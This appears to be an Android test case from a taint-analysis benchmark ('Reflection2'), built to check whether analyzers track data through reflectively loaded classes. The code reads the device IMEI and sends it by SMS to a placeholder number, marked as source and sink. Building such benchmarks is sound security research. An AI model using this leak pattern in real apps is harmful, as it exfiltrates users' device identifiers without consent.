package de.ecspride;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.view.View;
import android.widget.Button;
import android.util.Log;

/**
 * @testcase_name Reflection2
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description A class instance is created using reflection. Sensitive data is stored
 * 	in a field of this class, read out again using a method implemented in the "unknown"
 * 	class and leaked.
 * @dataflow onCreate: source -> bc.imei -> sink
 * @number_of_leaks 1
 * @challenges The analysis must be able to handle code implemented in classes loaded
 * 	using reflection.
 */
public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.SEND_SMS}, PackageManager.PERMISSION_GRANTED);

		((Button) findViewById(R.id.trigger)).setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View view) {
				reflectionTest();
			}
		});

	}


	private void reflectionTest(){

		try {
			BaseClass bc = (BaseClass) Class.forName("de.ecspride.ConcreteClass").newInstance();
			TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
			bc.imei = telephonyManager.getDeviceId(); //source

			SmsManager sms = SmsManager.getDefault();
			sms.sendTextMessage("+49 1234", null, bc.foo(), null, null);   //sink, leak
		} catch (InstantiationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
